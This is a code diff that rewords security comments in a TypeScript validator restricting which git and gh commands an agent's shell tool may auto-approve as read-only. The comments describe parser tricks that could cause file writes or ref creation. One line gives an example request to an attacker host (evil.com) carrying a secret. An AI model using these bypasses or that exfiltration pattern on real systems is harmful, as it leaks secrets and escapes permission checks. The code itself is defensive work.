@@ -165,7 +165,7 @@ export const GIT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
       // pickaxe string (standard getopt: required-arg options consume next
       // argv unconditionally, BEFORE the top-level `--` check) → cursor at
       // --output=... → parses as long option → ARBITRARY FILE WRITE.
-      // git log config at line ~207 correctly has -S/-G as 'string'.
+      // The `'git log'` config below correctly has -S/-G as 'string'.
       '-S': 'string',
       '-G': 'string',
       '-O': 'string',
@@ -278,8 +278,10 @@ export const GIT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
     // SECURITY: Block `git reflog expire` (positional subcommand) — it writes
     // to .git/logs/** by expiring reflog entries. `git reflog delete` similarly
     // writes. Only `git reflog` (bare = show) and `git reflog show` are safe.
-    // The positional-arg fallthrough at ~:1730 would otherwise accept `expire`
-    // as a non-flag arg, and `--all` is in GIT_REF_SELECTION_FLAGS → passes.
+    // validateFlags's positional-arg fallthrough — the branch commented
+    // `Non-flag argument (like revision specs, file paths, etc.)` — would
+    // otherwise accept `expire` as a non-flag arg, and `--all` is in
+    // GIT_REF_SELECTION_FLAGS → passes.
     additionalCommandIsDangerousCallback: (
       _rawCommand: string,
       args: string[],
@@ -731,8 +733,10 @@ export const GIT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
     // creates .git/refs/tags/foo (41-byte file write) — NOT read-only.
     // This is identical semantics to `git branch foo` (which has the same
     // callback below). Without this callback, validateFlags's default
-    // positional-arg fallthrough at ~:1730 accepts `mytag` as a non-flag arg,
-    // and git tag auto-approves. While the write is constrained (path limited
+    // positional-arg fallthrough — the branch commented
+    // `Non-flag argument (like revision specs, file paths, etc.)` — accepts
+    // `mytag` as a non-flag arg, and git tag auto-approves. While the write is
+    // constrained (path limited
     // to .git/refs/tags/, content is fixed HEAD SHA), it violates the
     // read-only invariant and can pollute CI/CD tag-pattern matching or make
     // abandoned commits reachable via `git tag foo <commit>`.
@@ -934,8 +938,9 @@ export const GIT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
 //   → GET https://evil.com/api/v3/repos/BASE32SECRET/x/pulls/1
 // gh also accepts positional URLs: `gh pr view https://evil.com/owner/repo/pull/1`
 //
-// git ls-remote has an inline URL guard (readOnlyValidation.ts:~944); this
-// callback provides the equivalent for gh. Rejects:
+// git ls-remote has an inline URL guard — the `tokens[1] === 'ls-remote'`
+// branch in src/tools/BashTool/readOnlyValidation.ts. This callback provides
+// the equivalent for gh. Rejects:
 //   - Any token with 2+ slashes (HOST/OWNER/REPO format — normal is OWNER/REPO)
 //   - Any token with `://` (URL)
 //   - Any token with `@` (SSH-style)
@@ -1734,9 +1739,10 @@ export function validateFlags(
       // Handle --flag=value format
       // SECURITY: Track whether the token CONTAINS `=` separately from
       // whether the value is non-empty. `-E=` has `hasEquals=true` but
-      // `inlineValue=''` (falsy). Without `hasEquals`, the falsy check at
-      // line ~1813 would fall through to "consume next token" — but GNU
-      // getopt for short options with mandatory arg sees `-E=` as `-E` with
+      // `inlineValue=''` (falsy). Without `hasEquals`, the falsy check would
+      // fall through to the `Check if next token is the argument` branch below
+      // and consume that token — but GNU getopt for short options with
+      // mandatory arg sees `-E=` as `-E` with
       // ATTACHED arg `=` (it doesn't strip `=` for short options). Parser
       // differential: validator advances 2 tokens, GNU advances 1.
       //
